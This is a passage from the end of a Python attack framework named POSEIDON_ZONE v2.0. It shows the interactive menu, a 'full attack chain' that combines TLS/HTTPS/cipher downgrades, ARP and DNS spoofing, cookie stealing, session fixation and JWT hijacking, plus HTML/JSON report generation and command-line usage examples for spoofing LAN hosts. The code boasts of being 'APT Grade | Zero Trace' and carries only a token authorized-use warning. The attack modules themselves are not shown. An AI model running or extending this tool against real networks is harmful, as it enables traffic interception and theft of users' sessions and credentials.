                   Colors.GREEN if result.success else Colors.RED)
    
    def jwt_hijack(self):
        target = input("[>] Target: ").strip()
        if target:
            result = self.session_hijack.jwt_hijack(target)
            self.results.append(result)
            cprint(f"\n[+] JWT Hijack: {'SUCCESS' if result.success else 'FAILED'}", 
                   Colors.GREEN if result.success else Colors.RED)
    
    def full_attack(self):
        cprint("\n[FULL] Executing full attack chain...", Colors.RED, bold=True)
        
        target = input("[>] Target: ").strip()
        if not target:
            cprint("[-] Target required", Colors.RED)
            return
        
        results = []
        
        # Phase 1: Protocol Downgrade
        cprint("[PHASE 1] Protocol Downgrade", Colors.GOLD)
        results.append(self.downgrade.downgrade_tls(target, 443))
        results.append(self.downgrade.downgrade_https(target))
        results.append(self.downgrade.downgrade_cipher(target, 443))
        
        # Phase 2: Network Manipulation
        cprint("[PHASE 2] Network Manipulation", Colors.GOLD)
        gateway = input("[>] Gateway IP: ").strip()
        if gateway:
            cprint("[*] ARP spoofing active. Press Ctrl+C to stop", Colors.YELLOW)
            results.append(self.network.arp_spoof(target, gateway))
        
        redirect = input("[>] Redirect IP (for DNS spoof): ").strip()
        if redirect:
            cprint("[*] DNS spoofing active. Press Ctrl+C to stop", Colors.YELLOW)
            results.append(self.network.dns_spoof(target, redirect))
        
        # Phase 3: Session Hijacking
        cprint("[PHASE 3] Session Hijacking", Colors.GOLD)
        results.append(self.session_hijack.cookie_steal(target))
        results.append(self.session_hijack.session_fixation(target))
        results.append(self.session_hijack.jwt_hijack(target))
        
        self.results.extend(results)
        
        cprint("\n[+] Full attack complete!", Colors.GREEN)
        
        # Show summary
        success_count = sum(1 for r in results if r.success)
        cprint(f"[+] Successful attacks: {success_count}/{len(results)}", 
               Colors.GREEN if success_count > 0 else Colors.RED)
    
    def show_results(self):
        print("\n" + "="*70)
        cprint(" POSEIDON RESULTS", Colors.PURPLE, bold=True)
        print("="*70)
        
        if not self.results:
            cprint("[!] No results", Colors.YELLOW)
            return
        
        for i, result in enumerate(self.results):
            status = "SUCCESS" if result.success else "FAILED"
            color = Colors.GREEN if result.success else Colors.RED
            cprint(f"\n[{i+1}] {result.method} -> {result.target}", Colors.CYAN)
            cprint(f"    Status: {status}", color)
            cprint(f"    Severity: {result.severity}", Colors.YELLOW)
            if result.success:
                if isinstance(result.data, list):
                    cprint(f"    Data: {len(result.data)} items", Colors.DIM)
                    for item in result.data[:3]:
                        if isinstance(item, dict):
                            cprint(f"      - {json.dumps(item)[:100]}", Colors.DIM)
                else:
                    cprint(f"    Data: {str(result.data)[:200]}", Colors.DIM)
        
        print("="*70)
    
    def generate_report(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"poseidon_report_{timestamp}.json"
        
        report = {
            'version': VERSION,
            'author': AUTHOR,
            'timestamp': datetime.now().isoformat(),
            'results': [r.__dict__ for r in self.results]
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        cprint(f"[+] Report saved: {filename}", Colors.GREEN)
        
        # Generate HTML
        self._generate_html_report(timestamp)
    
    def _generate_html_report(self, timestamp: str):
        html_filename = f"poseidon_report_{timestamp}.html"
        
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>POSEIDON_ZONE v{VERSION} - Protocol Downgrade Report</title>
    <style>
        body {{ font-family: 'Segoe UI', Arial, sans-serif; margin: 20px; background: #0a0a0a; color: #00ff00; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{ background: linear-gradient(90deg, #001a33, #000000, #001a33); padding: 30px; 
                 border: 2px solid #00aaff; border-radius: 10px; margin-bottom: 20px; }}
        h1 {{ color: #00aaff; text-shadow: 0 0 20px #00aaff; }}
        .card {{ background: #111; border: 1px solid #333; padding: 20px; margin: 10px 0; border-radius: 8px; }}
        .success {{ color: #00ff00; }}
        .failed {{ color: #ff0000; }}
        .critical {{ color: #ff00ff; }}
        .high {{ color: #ff4444; }}
        .medium {{ color: #ffaa44; }}
        .low {{ color: #44ff44; }}
        table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
        th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #333; }}
        th {{ background: #001a33; color: #00aaff; }}
        tr:hover {{ background: #1a1a1a; }}
        .summary {{ background: #0a0a0a; border: 2px solid #00aaff; padding: 20px; margin: 20px 0; border-radius: 8px; }}
        .badge {{ display: inline-block; padding: 3px 10px; border-radius: 4px; font-size: 12px; }}
        .badge-success {{ background: #00ff00; color: #000; }}
        .badge-failed {{ background: #ff0000; color: #fff; }}
        .badge-critical {{ background: #ff00ff; color: #000; }}
        .badge-high {{ background: #ff4444; color: #fff; }}
        .badge-medium {{ background: #ffaa44; color: #000; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>POSEIDON_ZONE v{VERSION} - Protocol Downgrade Report</h1>
            <p>Generated: {datetime.now().isoformat()}</p>
            <p>Author: {AUTHOR}</p>
        </div>
"""
        
        if self.results:
            success_count = sum(1 for r in self.results if r.success)
            html += f"""
                <div class="summary">
                    <h2>Executive Summary</h2>
                    <p>Total Attacks: {len(self.results)}</p>
                    <p>Successful: {success_count}</p>
                    <p>Failed: {len(self.results) - success_count}</p>
                </div>
                
                <h2>Detailed Results</h2>
                <table>
                    <tr><th>#</th><th>Method</th><th>Target</th><th>Status</th><th>Severity</th><th>Details</th></tr>
            """
            
            for i, result in enumerate(self.results):
                status_class = 'success' if result.success else 'failed'
                status_text = 'SUCCESS' if result.success else 'FAILED'
                html += f"""
                    <tr>
                        <td>{i+1}</td>
                        <td>{result.method}</td>
                        <td>{result.target}</td>
                        <td><span class="badge badge-{status_class}">{status_text}</span></td>
                        <td>{result.severity}</td>
                        <td>{str(result.data)[:100]}</td>
                    </tr>
                """
            
            html += "</table>"
        
        html += """
    </div>
</body>
</html>
"""
        
        with open(html_filename, 'w') as f:
            f.write(html)
        
        cprint(f"[+] HTML Report saved: {html_filename}", Colors.GREEN)
    
    def run(self):
        print_banner()
        cprint("[*] POSEIDON_ZONE v2.0 - Ultimate Protocol Downgrade Framework", Colors.CYAN)
        cprint("[*] APT Grade | Zero Trace | Full Spectrum Attack", Colors.DIM)
        cprint("[!] WARNING: This tool is for authorized security testing only", Colors.RED)
        cprint("[!] You are fully accountable for your actions", Colors.RED)
        
        while self.running:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select (1-16): {Colors.WHITE}").strip()
            
            if choice == '1':
                self.tls_downgrade()
            elif choice == '2':
                self.https_downgrade()
            elif choice == '3':
                self.auth_downgrade()
            elif choice == '4':
                self.cipher_downgrade()
            elif choice == '5':
                self.arp_spoof()
            elif choice == '6':
                self.dns_spoof()
            elif choice == '7':
                self.ssl_strip()
            elif choice == '8':
                self.tcp_hijack()
            elif choice == '9':
                self.icmp_tunnel()
            elif choice == '10':
                self.cookie_steal()
            elif choice == '11':
                self.session_fixation()
            elif choice == '12':
                self.jwt_hijack()
            elif choice == '13':
                self.full_attack()
            elif choice == '14':
                self.show_results()
            elif choice == '15':
                self.generate_report()
            elif choice == '16':
                cprint("[*] Poseidon sinking...", Colors.GOLD)
                self.running = False
                self.network.running = False
                self.network.stop_event.set()
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ============================[ MAIN ]================================
def main():
    parser = argparse.ArgumentParser(
        description="POSEIDON_ZONE v2.0 - Ultimate Protocol Downgrade Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  # Interactive Mode
  sudo python3 poseidon_zone_v2.py
  
  # TLS Downgrade
  sudo python3 poseidon_zone_v2.py --target example.com --downgrade-tls
  
  # HTTPS Downgrade
  sudo python3 poseidon_zone_v2.py --target example.com --downgrade-https
  
  # ARP Spoofing
  sudo python3 poseidon_zone_v2.py --spoof --target 192.168.1.100 --gateway 192.168.1.1
  
  # DNS Spoofing
  sudo python3 poseidon_zone_v2.py --dns-spoof --target 192.168.1.100 --redirect 192.168.1.1
  
  # Full Attack
  sudo python3 poseidon_zone_v2.py --target example.com --full
  
  # Generate Report
  sudo python3 poseidon_zone_v2.py --report
        """
    )
    
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
    parser.add_argument("--target", help="Target IP or domain")
    parser.add_argument("--downgrade-tls", action="store_true", help="TLS downgrade attack")
    parser.add_argument("--downgrade-https", action="store_true", help="HTTPS downgrade attack")
    parser.add_argument("--spoof", action="store_true", help="ARP spoofing")
    parser.add_argument("--gateway", help="Gateway IP for ARP spoofing")
    parser.add_argument("--dns-spoof", action="store_true", help="DNS spoofing")
    parser.add_argument("--redirect", help="Redirect IP for DNS spoofing")
    parser.add_argument("--ssl-strip", action="store_true", help="SSL stripping")
    parser.add_argument("--full", action="store_true", help="Full attack chain")
    parser.add_argument("--report", action="store_true", help="Generate report")
    parser.add_argument("-o", "--output", help="Output file")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        cprint("[!] Root privileges required", Colors.RED)
        sys.exit(1)
    
    if not SCAPY_AVAILABLE:
        cprint("[!] Scapy required: pip3 install scapy", Colors.RED)
        sys.exit(1)
    
    tool = PoseidonZone(args.interface)
    
    if args.target and args.downgrade_tls:
        result = tool.downgrade.downgrade_tls(args.target, 443)
        print(json.dumps(result.__dict__, indent=2))
        sys.exit(0)
    
    if args.target and args.downgrade_https:
        result = tool.downgrade.downgrade_https(args.target)
        print(json.dumps(result.__dict__, indent=2))
        sys.exit(0)
    
    if args.spoof and args.target and args.gateway:
        cprint("[*] ARP spoofing active. Press Ctrl+C to stop", Colors.YELLOW)
        result = tool.network.arp_spoof(args.target, args.gateway)
        print(json.dumps(result.__dict__, indent=2))
        sys.exit(0)
    
    if args.dns_spoof and args.target and args.redirect:
        cprint("[*] DNS spoofing active. Press Ctrl+C to stop", Colors.YELLOW)
        result = tool.network.dns_spoof(args.target, args.redirect)
        print(json.dumps(result.__dict__, indent=2))
        sys.exit(0)
    
    if args.ssl_strip and args.target:
        result = tool.network.ssl_strip(args.target, 10000)
        print(json.dumps(result.__dict__, indent=2))
        sys.exit(0)
    
    if args.full and args.target:
        cprint("[*] Executing full attack chain...", Colors.RED, bold=True)
        
        # Phase 1
        tool.results.append(tool.downgrade.downgrade_tls(args.target, 443))
        tool.results.append(tool.downgrade.downgrade_https(args.target))
        
        # Phase 2
        gateway = args.gateway or input("[>] Gateway IP: ").strip()
        if gateway:
            cprint("[*] ARP spoofing active. Press Ctrl+C to stop", Colors.YELLOW)
            tool.results.append(tool.network.arp_spoof(args.target, gateway))
        
        redirect = args.redirect or input("[>] Redirect IP (DNS spoof): ").strip()
        if redirect:
            cprint("[*] DNS spoofing active. Press Ctrl+C to stop", Colors.YELLOW)
            tool.results.append(tool.network.dns_spoof(args.target, redirect))
        
        # Phase 3
        tool.results.append(tool.session_hijack.cookie_steal(args.target))
        tool.results.append(tool.session_hijack.session_fixation(args.target))
        
        tool.show_results()
        sys.exit(0)
    
    if args.report:
        tool.generate_report()
        sys.exit(0)
    
    # Interactive mode
    tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
    except Exception as e:
        cprint(f"\n[!] Error: {e}", Colors.RED)
        import traceback
        traceback.print_exc()
        sys.exit(1)
